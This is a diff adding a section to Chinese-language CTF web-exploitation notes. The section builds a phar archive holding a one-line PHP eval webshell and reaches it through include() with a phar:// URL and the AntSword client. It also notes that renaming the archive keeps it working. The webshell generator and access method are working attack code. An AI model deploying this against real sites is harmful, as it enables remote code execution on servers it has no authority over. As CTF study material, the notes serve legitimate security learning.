@@ -568,6 +568,28 @@ GIF89a
 
 (经测试，a.jpg 必须在 .user.ini 之后上传)
 
+###### 构造 phar
+
+- 漏洞突破口：`include()` 或 `file_get_contents()` 。（服务端往往对我们是不可见的，可以用 `phar` 来测试找到的 GET 或 POST 参数） 
+
+下面代码会生成一个 example.phar 的文件
+
+```php
+<?php
+    $payload = '<?php eval($_POST["a"]); ?>'; //一句话木马
+    $phar = new Phar("example.phar"); //后缀名必须为phar
+    $phar->startBuffering();
+    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+    $phar->addFromString("67.php", "$payload"); //添加要压缩的文件
+    // $phar->setMetadata(...); //在metadata添加内容，可参考 phar反序列化，此处用不着，故注释
+    $phar->stopBuffering();
+?>
+```
+
+用蚁剑连接 `http://x/?a=phar://example.phar/67.php` 即可（`67.php` 是构造 phar 时压进去的内容是 `<?php eval($_POST["a"]); ?>`）
+
+**注意：把 `example.phar` 更名为 `example.zip` 或其他后缀仍然可行**
+
 ##### 伪协议
 
 - 网页上显示的未必是真实源码，如果题目过滤了网页中代码没显示的字符，应该联想到网页中代码不真实。也许题目只过滤了 flag.php，并没有过滤 index.php
